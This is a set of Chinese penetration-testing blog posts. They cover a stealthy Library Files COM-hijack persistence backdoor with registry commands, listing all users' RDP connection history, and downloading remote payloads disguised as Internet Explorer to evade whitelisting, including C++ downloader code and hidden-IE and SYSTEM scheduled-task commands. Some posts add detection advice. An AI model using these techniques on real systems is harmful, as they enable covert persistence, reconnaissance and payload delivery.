
<p>官方文档：</p>

<p>https://docs.microsoft.com/en-us/windows/client-management/windows-libraries</p>

<p>Library Files的简单理解：</p>

<p>能够同时显示多个文件夹中的内容</p>

<h3 id="1实际测试-1">1、实际测试：</h3>

<h4 id="1修改注册表添加注册表项-1">(1)修改注册表，添加注册表项</h4>

<p>bat命令如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>SET KEY=HKEY_CURRENT_USER\Software\Classes\CLSID\{11111111-1111-1111-1111-111111111111}\
REG.EXE ADD %KEY%InProcServer32 /VE /T REG_SZ /D "c:\test\calc.dll" /F
REG.EXE ADD %KEY%InProcServer32 /V ThreadingModel /T REG_SZ /D Apartment /F
REG.EXE ADD %KEY%ShellFolder /V Attributes /T REG_DWORD /D 4035969341 /F
</code></pre></div></div>

<p><strong>注：</strong></p>

<p>相比Junction Folders，Library Files需要多添加一个注册表项</p>

<h4 id="2修改appdatamicrosoftwindowslibrariesdocumentslibrary-ms">(2)修改%appdata%\Microsoft\Windows\Libraries\Documents.library-ms</h4>

<p>按照xml格式添加如下内容：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    &lt;searchConnectorDescription publisher="Microsoft" product="Windows"&gt;
      &lt;description&gt;@shell32.dll,-34577&lt;/description&gt;
      &lt;isDefaultNonOwnerSaveLocation&gt;true&lt;/isDefaultNonOwnerSaveLocation&gt;
      &lt;simpleLocation&gt;
        &lt;url&gt;shell:::{11111111-1111-1111-1111-111111111111}&lt;/url&gt;
      &lt;/simpleLocation&gt;
    &lt;/searchConnectorDescription&gt;
</code></pre></div></div>

<h4 id="3访问appdatamicrosoftwindowslibrariesdocumentslibrary-ms">(3)访问%appdata%\Microsoft\Windows\Libraries\Documents.library-ms</h4>

<p>打开文件时将多次加载dll，这里可以加一个互斥量避免多次启动，下载地址(仅作演示用)：</p>

<p>https://github.com/3gstudent/test/raw/master/calcmutex.dll</p>

<p>值得注意的地方：</p>

<p><code class="language-plaintext highlighter-rouge">Includes</code>由<code class="language-plaintext highlighter-rouge">2 locations</code>变成<code class="language-plaintext highlighter-rouge">3 locations</code></p>

<p>如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-10-14/2-1.png" alt="Alt text"></p>

<p>查看该位置，能够发现加载的CLSID，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-10-14/2-2.png" alt="Alt text"></p>

<h3 id="2系统开机自动加载的实现方法用户权限-1">2、系统开机自动加载的实现方法(用户权限)</h3>

<p>将修改后的Documents.library-ms放在以下任一位置：</p>

<ul>
  <li>%appdata%\Microsoft\Windows\Start Menu\Programs\</li>
  <li>%appdata%\Microsoft\Windows\Start Menu\Programs\的子目录</li>
</ul>

<p><strong>注：</strong></p>

<p>还可以修改Music.library-ms和Pictures.library-ms，甚至是自己创建(可以指定显示的图标)</p>

<h2 id="0x04-library-files后门的进一步利用">0x04 Library Files后门的进一步利用</h2>
<hr>

<p>对于Library Files的后门利用方法，最明显的特征是从<code class="language-plaintext highlighter-rouge">Includes</code>即可发现加载的CLSID</p>

<p>这里给出一个解决方法：</p>

<p>将路径清空，并且指定为不显示</p>

<p>成功隐藏加载的CLSID，最终的效果如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-10-14/2-3.png" alt="Alt text"></p>

<h3 id="1实现方法">1、实现方法</h3>

<p>按照xml格式，清空原<code class="language-plaintext highlighter-rouge">&lt;searchConnectorDescription&gt;</code>，添加如下代码：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    &lt;searchConnectorDescription publisher="Microsoft" product="Windows"&gt;
      &lt;description&gt;@shell32.dll,-34577&lt;/description&gt;
      &lt;isDefaultNonOwnerSaveLocation&gt;false&lt;/isDefaultNonOwnerSaveLocation&gt;
      &lt;isSearchOnlyItem&gt;true&lt;/isSearchOnlyItem&gt;
      &lt;simpleLocation&gt;
        &lt;url&gt;shell:::{11111111-1111-1111-1111-111111111111}&lt;/url&gt;
      &lt;/simpleLocation&gt;
    &lt;/searchConnectorDescription&gt;
</code></pre></div></div>

<h3 id="2通过powershell实现的poc">2、通过powershell实现的POC</h3>

<p>经测试，不需要指定<code class="language-plaintext highlighter-rouge">&lt;ownerSID&gt;</code>，可以使用固定模板</p>

<p>流程如下：</p>

<ul>
  <li>修改注册表</li>
  <li>在指定目录释放Documents.library-ms</li>
</ul>

<p>脚本编写需要注意的地方：</p>

<ol>
  <li>
    <p>需要指定输出的编码格式为UTF-8，默认为UTF-16(unicode)，会导致library-ms文件格式错误</p>
  </li>
  <li>
    <p>为了向字符串中传入变量$clsid，字符串的定义要使用双引号”，而不是单引号’</p>
  </li>
</ol>

<p>完整代码可参考：</p>

<p>https://github.com/3gstudent/Homework-of-Powershell/blob/master/Invoke-LibraryFilesPersistence.ps1</p>

<p>代码实现了添加注册表项并创建文件<code class="language-plaintext highlighter-rouge">%appdata%\Microsoft\Windows\Libraries\Documents.library-ms</code>，在用户登录时会加载<code class="language-plaintext highlighter-rouge">c:\test\calc.dll</code></p>

<h2 id="0x05-检测和识别">0x05 检测和识别</h2>
<hr>

<p>对于Junction Folders和Library Files的利用方法，特别的地方：</p>

<ul>
  <li>普通用户权限即可</li>
  <li>文件格式不常见，欺骗性高</li>
</ul>

<p>结合利用方法，可对每个环节进行检查：</p>

<ol>
  <li>
    <p>是否存在可疑dll
 payload必须为dll格式</p>
  </li>
  <li>
    <p>注册表CLISD下是否有可疑dll
可监控注册表的敏感位置<code class="language-plaintext highlighter-rouge">HKEY_LOCAL_MACHINE\SOFTWARE\Classes\CLSID</code>和<code class="language-plaintext highlighter-rouge">HKEY_CURRENT_USER\Software\Classes\CLSID</code></p>
  </li>
  <li>
    <p>对于Junction Folders，遍历文件夹，检查后缀名是否关联可疑CLSID
 对于Library Files，遍历library-ms文件，检查是否关联可疑CLSID
 这个可直接参考Jayden Zheng的脚本：
 https://gist.github.com/countercept/6890be67e09ba3daed38fa7aa6298fdf</p>
  </li>
</ol>

<h2 id="0x06-小结">0x06 小结</h2>
<hr>

<p>本文测试了Junction Folders和Library Files的利用方法，对Library Files的后门利用方法做进一步利用，用来增加隐蔽性，开源了POC并且介绍了脚本编写需要注意的地方，最后在检测上面分享自己的理解</p>

<hr>

<p><a href="https://github.com/3gstudent/feedback/issues/new">LEAVE A REPLY</a></p>


  </div>

  <div class="date">
    Written on October 14, 2018
  </div>

  
</article><article class="post">
  <h1>渗透技巧——获得Windows系统的远程桌面连接历史记录</h1>

  <div class="entry">
    <h2 id="0x00-前言">0x00 前言</h2>
<hr>

<p>在渗透测试中，远程桌面连接的历史记录不可忽视，根据历史记录往往能定位出关键的服务器。</p>

<p>前几天有一篇文章介绍了如何清除记录，那么这篇文章就来介绍一下如何导出历史记录。</p>

<p>清除记录的文章地址如下：</p>

<p>http://woshub.com/how-to-clear-rdp-connections-history/#h2_3</p>

<p>最开始的设想是通过枚举注册表就能够完成，但深入研究发现，想要获得所有用户的历史记录，需要逐个获得用户的NTUSER.DAT文件，通过注册表加载配置单元，导入用户配置信息，再进行枚举才能够实现。</p>

<h2 id="0x01-简介">0x01 简介</h2>
<hr>

<p>本文将要介绍以下内容：</p>

<ul>
  <li>获得历史记录的思路</li>
  <li>导出登录用户的历史记录</li>
  <li>导出所有用户的历史记录</li>
  <li>两种方法的实现思路和脚本编写细节</li>
</ul>

<h2 id="0x02-获得远程桌面连接历史记录的思路">0x02 获得远程桌面连接历史记录的思路</h2>
<hr>

<h3 id="1获得当前用户的历史记录">1、获得当前用户的历史记录：</h3>

<p>枚举注册表键值<code class="language-plaintext highlighter-rouge">HKCU:\Software\Microsoft\Terminal Server Client\Servers</code></p>

<p>每个注册表项保存连接的服务器地址，其中的键值<code class="language-plaintext highlighter-rouge">UsernameHint</code>对应登录用户名</p>

<p>如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-3-15/2-1.png" alt="Alt text"></p>

<h3 id="2获得已登录用户的历史记录">2、获得已登录用户的历史记录：</h3>

<p>已登录用户的注册表信息会同步保存在<code class="language-plaintext highlighter-rouge">HKEY_USERS\SID</code>下，SID要对应每个用户的SID</p>

<p>当前系统登录两个用户，分别有两个子项，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-3-15/2-2.png" alt="Alt text"></p>

<p><strong>注：</strong></p>

<p>HKEY_USERS仅包含了缺省用户设置和登录用户的信息，在用户未登录时用户的设置是不可用的</p>

<p>也就是说，如果当前登录了两个用户，那么这两个用户的注册表信息都会保存在<code class="language-plaintext highlighter-rouge">HKEY_USERS\SID</code>下，如果第三个用户未登录，无法直接获得该用户的注册表信息，也就无法导出该用户的远程桌面连接历史记录</p>

<p>所以，通过枚举注册表键值<code class="language-plaintext highlighter-rouge">HKEY_USERS\SID\Software\Microsoft\Terminal Server Client\Servers</code>能够获得已登录用户的远程桌面连接历史记录</p>

<h3 id="3获得所有用户的历史记录">3、获得所有用户的历史记录：</h3>

<p>对于未登录用户，无法直接获得注册表配置信息，这里可以通过加载配置单元的方式来解决</p>

<p>选中HKEY_USERS项，<code class="language-plaintext highlighter-rouge">文件</code>-<code class="language-plaintext highlighter-rouge">加载配置单元</code>，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-3-15/2-3.png" alt="Alt text"></p>

<p>打开用户的NTUSER.DAT文件，路径为<code class="language-plaintext highlighter-rouge">C:\Documents and Settings\用户名\NTUSER.DAT</code></p>

<p>接着指定一个项名称，即可在HKEY_USERS下读取该用户的注册表配置信息，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-3-15/2-4.png" alt="Alt text"></p>

<p><strong>注：</strong></p>

<p>删除该项需要通过卸载配置单元来清除</p>

<p>所以，想要获得所有用户的远程桌面连接历史记录，首先需要枚举注册表键值<code class="language-plaintext highlighter-rouge">HKEY_USERS\SID\</code>，对于未登录用户，需要加载对应的NTUSER.DAT文件，再次枚举获得完整记录，最后卸载对应的注册表项</p>

<p><strong>补充：</strong></p>

<p>通过命令行实现加载配置单元的实例：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Reg load HKEY_USERS\S-1-5-21-1170783345-3748964848-1387080272-1003 C:\Documents and Settings\c\NTUSER.DAT
</code></pre></div></div>

<p>通过命令行实现卸载配置单元的实例：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Reg unload HKEY_USERS\S-1-5-21-1170783345-3748964848-1387080272-1003
</code></pre></div></div>

<h2 id="0x03-powershell实现细节">0x03 powershell实现细节</h2>
<hr>

<h3 id="1获得当前用户的历史记录-1">1、获得当前用户的历史记录</h3>

<p>位置:<code class="language-plaintext highlighter-rouge">HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Servers</code></p>

<p>枚举指定注册表项下的子项:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>dir "Registry::HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Servers" -Name
</code></pre></div></div>

<p>查询指定注册表项的注册表键值:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>(Get-ItemProperty -Path "Registry::HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Servers\192.168.62.137").UsernameHint
</code></pre></div></div>

<p>加入foreach循环实现枚举:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$RegPath = "Registry::HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Servers\"
$QueryPath = dir $RegPath -Name
foreach($Name in $QueryPath)
{
    (Get-ItemProperty -Path $RegPath$Name).UsernameHint
}
</code></pre></div></div>

<p>加入捕获异常，不输出错误信息，如果查不到注册表键值，返回无法获得</p>

<p>完整脚本:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$RegPath = "Registry::HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Servers\"
$QueryPath = dir $RegPath -Name
foreach($Name in $QueryPath)
{   
	Try  
	{  
		$User = (Get-ItemProperty -Path $RegPath$Name -ErrorAction Stop | Out-Null).UsernameHint
    		Write-Host "Server:"$Name
    		Write-Host "User:"$User"`n"
    	}
    	Catch  
    	{
		Write-Host "No RDP Connections History"
    	}
}
</code></pre></div></div>

<h3 id="2获得已登录用户的历史记录-1">2、获得已登录用户的历史记录</h3>

<p>位置:<code class="language-plaintext highlighter-rouge">HKEY_USERS\SID\Software\Microsoft\Terminal Server Client\Servers</code></p>

<p><strong>注:</strong></p>

<p>SID对应每个用户的sid</p>

<p>首先需要枚举所有用户sid</p>

<p>powershell:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Get-WmiObject -Class Win32_UserAccount
</code></pre></div></div>

<p>wmi:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wmic /NAMESPACE:"\\root\CIMV2" PATH Win32_UserAccount GET /all  /FORMAT:list
</code></pre></div></div>

<p>枚举用户名及其对应的SID:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$AllUser = Get-WmiObject -Class Win32_UserAccount

foreach($User in $AllUser)
{
	Write-Host $User.Name":"$User.SID
}
</code></pre></div></div>

<p>将以上脚本结合，先枚举用户的SID，查询对应HKEY_USERS下的注册表项，再次枚举注册表键值项，获得完整结果:</p>

<p>(需要管理员权限)</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$AllUser = Get-WmiObject -Class Win32_UserAccount
foreach($User in $AllUser)
{
	$RegPath = "Registry::HKEY_USERS\"+$User.SID+"\Software\Microsoft\Terminal Server Client\Servers\"
	Write-Host "User:"$User.Name
	Write-Host "SID:"$User.SID
	Write-Host "Status:"$User.Status
	Try  
    	{ 
		$QueryPath = dir $RegPath -Name -ErrorAction Stop
	}
	Catch
	{
		Write-Host "No RDP Connections History"
		Write-Host "----------------------------------"
		continue
	}
	foreach($Name in $QueryPath)
	{   
		Try  
    		{  
    			$User = (Get-ItemProperty -Path $RegPath$Name -ErrorAction Stop).UsernameHint
    			Write-Host "Server:"$Name
    			Write-Host "User:"$User
    		}
    		Catch  
    		{
			Write-Host "No RDP Connections History"
    		}
	}
	Write-Host "----------------------------------"	
}
</code></pre></div></div>

<p><strong>注：</strong></p>

<p>$User.Status表示帐户状态，通过<code class="language-plaintext highlighter-rouge">Get-WmiObject -Class Win32_UserAccount</code>无法直接查询到，可通过wmi命令获取：
<code class="language-plaintext highlighter-rouge">wmic /NAMESPACE:"\\root\CIMV2" PATH Win32_UserAccount GET /all  /FORMAT:list</code></p>

<h3 id="3获得所有用户的历史记录-1">3、获得所有用户的历史记录</h3>

<p>加载配置单元的文件位置：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>"C:\Documents and Settings\用户名\NTUSER.DAT"
</code></pre></div></div>

<h4 id="实现思路">实现思路：</h4>

<ol>
  <li>获得每个用户对应的SID，拼接对应的注册表键值”Registry::HKEY_USERS"+$User.SID+”\Software\Microsoft\Terminal Server Client\Servers"</li>
  <li>如果读取失败，代表此用户未登录，接着尝试加载配置单元</li>
  <li>拼接配置单元文件位置”C:\Documents and Settings"+$User.Name+”\NTUSER.DAT”</li>
  <li>配置单元对应的注册表项以该用户的sid命名</li>
  <li>枚举注册表获得历史记录</li>
  <li>卸载注册表项</li>
</ol>

<p><strong>注：</strong></p>

<p>需要新启动一个进程来卸载配置单元，否则提示失败</p>

<p>为了避免使用多个try catch捕获异常，代码结构作了改变，使用If Else作判断，完整实现代码可参考：</p>

<p>https://github.com/3gstudent/List-RDP-Connections-History</p>

<p>测试结果如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-3-15/3-1.png" alt="Alt text"></p>

<h2 id="0x04-小结">0x04 小结</h2>
<hr>

<p>本文介绍了如何通过powershell获得Windows系统的远程桌面连接历史记录，需要注意的是无法直接获得未登录用户的注册表配置信息(可以加载配置单元解决)。根据远程桌面连接历史记录，往往能定位出关键的服务器。</p>

<hr>

<p><a href="https://github.com/3gstudent/feedback/issues/new">LEAVE A REPLY</a></p>


  </div>

  <div class="date">
    Written on March 15, 2018
  </div>

  
</article><article class="post">
  <h1>渗透技巧——模拟IE浏览器下载文件</h1>

  <div class="entry">
    <h2 id="0x00-前言">0x00 前言</h2>
<hr>

<p>在之前的文章<a href="https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-%E4%BB%8Egithub%E4%B8%8B%E8%BD%BD%E6%96%87%E4%BB%B6%E7%9A%84%E5%A4%9A%E7%A7%8D%E6%96%B9%E6%B3%95/">《渗透技巧——从github下载文件的多种方法》</a>介绍了通过cmd从github下载文件的多种方法，选出最短的实现代码(长度为25)。</p>

<p>本文将站在另一角度，介绍Windows系统下模拟IE浏览器实现文件下载的方法。</p>

<p>模拟IE浏览器实现文件下载不仅能够绕过白名单程序的拦截，而且能在一定程度上隐藏下载行为。所以本文将站在利用的角度介绍具体的利用方法，结合利用方法总结防御思路。</p>

<h2 id="0x01-简介">0x01 简介</h2>
<hr>
<p>本文将要介绍以下内容：</p>

<ul>
  <li>模拟IE浏览器实现文件下载的多种方法</li>
  <li>分析优缺点</li>
  <li>总结防御思路</li>
</ul>

<h2 id="0x02-实现方法">0x02 实现方法</h2>
<hr>

<p>由于方法众多，所以本文做了一个简单分类,整体上分为主动和被动两种模式。
主动模式代表通过命令主动实现文件下载，被动模式代表劫持用户行为，在用户打开IE时实现文件下载
其中，主动模式也要做一个区分，分为当前后台进程是否有IE浏览器进程iexplore.exe</p>

<p>具体方法如下：</p>

<h3 id="1主动模式">1、主动模式</h3>

<h4 id="1-后台无ie进程">(1) 后台无IE进程</h4>

<p><strong>a) 调用IE COM对象</strong></p>

<p>参考链接：</p>

<p>https://adapt-and-attack.com/2017/12/19/internetexplorer-application-for-c2/</p>

<p>通过COM对象<code class="language-plaintext highlighter-rouge">InternetExplorer.Application</code>实现文件下载，后台进程为iexplore.exe</p>

<p>powershell代码如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ie_com = New-Object -ComObject InternetExplorer.Application
$ie_com.Silent = $True
$ie_com.Visible = $False
$Headers = "Host: &lt;SNIP&gt;.cloudfront.net`r`n"
$ie_com.Navigate2("http://192.168.62.131/index.html", 14, 0, $Null, $Headers)
while($ie_com.busy -eq $true) {
    Start-Sleep -Milliseconds 100
}
$html = $ie_com.document.GetType().InvokeMember('body', [System.Reflection.BindingFlags]::GetProperty, $Null, $ie_com.document, $Null).InnerHtml
$html
$ie_com.Quit();
</code></pre></div></div>

<p><strong>注：</strong></p>

<p>若IE从未运行过，执行以上代码会弹框提示</p>

<p>powershell代码引用自https://gist.github.com/leoloobeek/f468d34e81795239a8f8bac03646cf59，该页面还包含cs、js和vbs的实现方法</p>

<p><strong>b) Process Hollowing</strong></p>

<p>参考文章：</p>

<p><a href="https://3gstudent.github.io/3gstudent.github.io/%E5%82%80%E5%84%A1%E8%BF%9B%E7%A8%8B%E7%9A%84%E5%AE%9E%E7%8E%B0%E4%B8%8E%E6%A3%80%E6%B5%8B/">《傀儡进程的实现与检测》</a></p>

<p>创建傀儡进程iexplore.exe，传入参数<code class="language-plaintext highlighter-rouge">CREATE_SUSPENDED</code>使进程挂起，清空iexplore.exe进程的内存数据，申请新的内存，写入payload，恢复寄存器环境，执行文件下载</p>

<p>通过c++实现的文件下载代码如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#include &lt;stdio.h&gt;
#include &lt;windows.h&gt;
#include &lt;wininet.h&gt;
#define MAXBLOCKSIZE 1024
#pragma comment( lib, "wininet.lib" ) ;
void download(const char *Url,const char *save_as)
{
  byte Temp[MAXBLOCKSIZE];
  ULONG Number = 1;

  FILE *stream;
  HINTERNET hSession = InternetOpen((LPCSTR)"RookIE/1.0", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
  if (hSession != NULL)
  {
    HINTERNET handle2 = InternetOpenUrl(hSession, (LPCSTR)Url, NULL, 0, INTERNET_FLAG_DONT_CACHE, 0);
    if (handle2 != NULL)
    {
      fopen_s(&amp;stream, save_as, "wb" );
      while (Number &gt; 0)
      {
        InternetReadFile(handle2, Temp, MAXBLOCKSIZE - 1, &amp;Number);

        fwrite(Temp, sizeof (char), Number , stream);
      }
      fclose( stream );
      InternetCloseHandle(handle2);
      handle2 = NULL;
    }
    InternetCloseHandle(hSession);
    hSession = NULL;
  }
}
int main(int argc, char* argv[]){
  download("https://github.com/3gstudent/test/raw/master/putty.exe","c:\\test\\putty.exe");
  return 0;
}
</code></pre></div></div>

<p>打开防火墙监控，下载进程为Internet Explorer，完整测试如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-1-3/1-1.gif" alt="Alt text"></p>

<p><strong>c) Process Doppelganging</strong></p>

<p>参考文章：</p>

<p><a href="https://3gstudent.github.io/3gstudent.github.io/Process-Doppelganging%E5%88%A9%E7%94%A8%E4%BB%8B%E7%BB%8D/">《Process-Doppelganging利用介绍》</a></p>

<p>原理上类似于Process Hollowing，实现思路为打开一个正常文件，创建transaction；在这个transaction内填入payload，payload作为进程被启动；回滚transaction</p>

<p>需要注意的是Process Doppelganging需要对正常文件进行写入操作。如果是对iexplore.exe进行利用，需要获得Trusted Installer权限，获得Trusted Installer权限的方法可参考文章：</p>

<p><a href="https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-Token%E7%AA%83%E5%8F%96%E4%B8%8E%E5%88%A9%E7%94%A8/">《渗透技巧——Token窃取与利用》</a></p>

<p><strong>d) 隐蔽启动IE，访问特定网址，通过缓存获得下载的文件</strong></p>

<p>第一种思路：</p>

<p>cmd启动IE，访问网址，通过缓存获得下载的文件</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>start "C:\Program Files\Internet Explorer\iexplore.exe" http://192.168.62.131/evil-kiwi.png
</code></pre></div></div>

<p><strong>注：</strong></p>

<p>这种方式会打开IE的界面，但可通过API <code class="language-plaintext highlighter-rouge">ShowWindowAsync</code>隐藏IE界面，powershell实现脚本：</p>

<p>https://github.com/3gstudent/Writeup/blob/master/HiddenProcess.ps1</p>

<p>第二种思路：</p>

<p>通过powershell隐蔽启动IE，访问网址，通过缓存获得下载的文件</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>powershell -executionpolicy bypass -Command "Start-Process -FilePath \"C:\Program Files\Internet Explorer\iexplore.exe\" -ArgumentList http://192.168.62.131/evil-kiwi.png -WindowStyle Hidden"
</code></pre></div></div>

<p>以上两种思路通过IE访问网址后，会在如下位置保存缓存文件：</p>

<ul>
  <li>Win7: <code class="language-plaintext highlighter-rouge">%LOCALAPPDATA%\Microsoft\Windows\Temporary Internet Files</code></li>
  <li>Win8、Win10: <code class="language-plaintext highlighter-rouge">%LOCALAPPDATA%\Microsoft\Windows\INetCache\IE</code></li>
</ul>

<p>可使用通配符获得不同系统下缓存文件的路径，命令如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>dir %LOCALAPPDATA%\*evil-kiwi*.png /s /b
</code></pre></div></div>

<p>以上两种思路会在IE浏览器留下历史记录，历史记录对应路径为： <code class="language-plaintext highlighter-rouge">%LOCALAPPDATA%\Microsoft\Windows\History\</code></p>

<p>该方法的父进程为powershell.exe，但可以通过token复制改变父进程(例如SelectMyParent、Invoke-TokenManipulation.ps1)</p>

<p>第三种思路:</p>

<p>利用计划任务启动IE，访问网址，通过缓存获得下载的文件(需要管理员权限)</p>

<p>命令1：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>at  6:34 "C:\Program Files\Internet Explorer\iexplore.exe" http://192.168.62.131/evil-kiwi.png
</code></pre></div></div>

<p>命令2：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>schtasks /create /RU SYSTEM /RP "" /SC ONCE /TN test1 /TR "C:\Program Files\Internet Explorer\iexplore.exe http://192.168.62.131/evil-kiwi.png" /ST 06:34 /F  
</code></pre></div></div>

<p>由于计划任务的权限为system，所以用户桌面无法查看启动的IE浏览器界面，缓存位置也不同，通用路径为<code class="language-plaintext highlighter-rouge">%windir%\System32\config\systemprofile\AppData\Local\Microsoft\Windows\</code>
可使用通配符获得不同系统下缓存文件的路径，命令如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>dir %windir%\*evil-kiwi*.png /s /b
</code></pre></div></div>

<p>所以使用计划任务打开的IE浏览器，不存在历史记录，父进程为svchost.exe</p>

<p>第四种思路：</p>

<p>创建服务启动IE，访问网址，通过缓存获得下载的文件</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sc create Test1 type= own binpath= "C:\Program Files\Internet Explorer\iexplore.exe"
sc start test1
</code></pre></div></div>

<p>通过这种方式启动的服务，调用的程序需要能够同SCM(Services Control Manager)进行交互，而iexplorer.exe不支持这个功能</p>

<p>可通过其他方式创建服务</p>

<p><strong>注：</strong></p>

<p>隐蔽启动IE，访问特定网址，通过缓存获得下载的文件后，需要手动结束IE进程</p>

<p><strong>e) 隐蔽启动ie，进行DLL注入(APC、Atombombing)</strong></p>

<p>隐蔽启动IE后，对IE进程进行dll注入，dll实现文件下载的功能</p>

<p>APC注入的代码可参考：</p>

<p>https://github.com/3gstudent/Inject-dll-by-APC</p>

<p>Atombombing可以理解为APC注入的升级版，可参考文章：</p>

<p><a href="https://3gstudent.github.io/3gstudent.github.io/AtomBombing%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90">《AtomBombing利用分析》</a></p>

<h4 id="2-后台有ie进程">(2) 后台有IE进程</h4>

<p><strong>a) DLL注入(APC、Atombombing)</strong></p>

<p>方法同上，不再赘述</p>

<h3 id="2被动模式">2、被动模式</h3>

<p><strong>a) DLL劫持</strong></p>

<p>这里仅给出一个实例： <code class="language-plaintext highlighter-rouge">C:\Program Files\Internet Explorer\IEShims.dll</code></p>

<p>该dll在IE浏览器打开时被加载</p>

<p>DLL开发思路：</p>

<p>可使用工具<code class="language-plaintext highlighter-rouge">exportstoc</code>，下载地址：</p>

<p>https://github.com/michaellandi/exportstoc</p>

<p>生成方法可参考文章：</p>

<p>https://3gstudent.github.io/3gstudent.github.io/Study-Notes-Weekly-No.1(Monitor-WMI_ExportsToC++_Use-DiskCleanup-bypass-UAC)/</p>

<p>原dll保留，启动时需要做一个互斥，避免多次启动</p>

<p><strong>b) BHO</strong></p>

<p>利用BHO(Browser Helper Object)劫持IE浏览器，在浏览器页面打开时实现文件下载，可参考文章：</p>

<p><a href="https://3gstudent.github.io/3gstudent.github.io/%E5%88%A9%E7%94%A8BHO%E5%AE%9E%E7%8E%B0IE%E6%B5%8F%E8%A7%88%E5%99%A8%E5%8A%AB%E6%8C%81">《利用BHO实现IE浏览器劫持》</a></p>

<h2 id="0x03-小结">0x03 小结</h2>
<hr>

<p>综上，模拟IE浏览器下载文件的实现方法如下：</p>

<p>(1) 主动模式</p>

<p>当前后台无IE进程：</p>

<ul>
  <li>调用IE COM对象</li>
  <li>Process Hollowing</li>
  <li>Process Doppelganging</li>
  <li>隐蔽启动IE，访问特定网址，通过缓存获得下载的文件
    <ul>
      <li>通过cmd启动</li>
      <li>通过服务启动</li>
      <li>创建服务启动</li>
    </ul>
  </li>
  <li>隐蔽启动IE，进行DLL注入(APC、Atombombing)</li>
</ul>

<p>当前后台有IE进程：</p>

<ul>
  <li>DLL注入(APC、Atombombing)</li>
</ul>

<p>(2) 被动模式</p>

<ul>
  <li>DLL劫持</li>
  <li>BHO</li>
</ul>

<p>站在防御的角度，应对主动模式的利用方法，需要注意iexplore.exe的父进程是否可疑；应对DLL注入和DLL劫持，可监控敏感API的调用；应对BHO对象，可监控特定注册表</p>

<hr>

<p><a href="https://github.com/3gstudent/feedback/issues/new">LEAVE A REPLY</a></p>


  </div>

  <div class="date">
    Written on January  1, 2018
  </div>

  
</article><article class="post">
  <h1>Catalog签名伪造——Long UNC文件名欺骗</h1>

  <div class="entry">
    <h2 id="0x00-前言">0x00 前言</h2>
<hr>

<p>在之前的两篇文章<a href="https://3gstudent.github.io/3gstudent.github.io/Authenticode%E7%AD%BE%E5%90%8D%E4%BC%AA%E9%80%A0-PE%E6%96%87%E4%BB%B6%E7%9A%84%E7%AD%BE%E5%90%8D%E4%BC%AA%E9%80%A0%E4%B8%8E%E7%AD%BE%E5%90%8D%E9%AA%8C%E8%AF%81%E5%8A%AB%E6%8C%81/">《Authenticode签名伪造——PE文件的签名伪造与签名验证劫持》</a>和<a href="https://3gstudent.github.io/3gstudent.github.io/Authenticode%E7%AD%BE%E5%90%8D%E4%BC%AA%E9%80%A0-%E9%92%88%E5%AF%B9%E6%96%87%E4%BB%B6%E7%B1%BB%E5%9E%8B%E7%9A%84%E7%AD%BE%E5%90%8D%E4%BC%AA%E9%80%A0/">《Authenticode签名伪造——针对文件类型的签名伪造》</a>介绍了Authenticode签名伪造的利用方法，这次将要介绍一个Catalog签名伪造的方法，利用Long UNC文件名欺骗系统，获得系统内置的Catalog签名</p>

<p><strong>注：</strong></p>

<p>本文介绍的技巧参考自Matt Graeber@mattifestation公开的资料，本文将结合自己的经验，整理相关内容，添加个人理解。</p>

<p>参考资料：</p>

<p>http://www.exploit-monday.com/2013/02/WindowsFileConfusion.html?m=1</p>

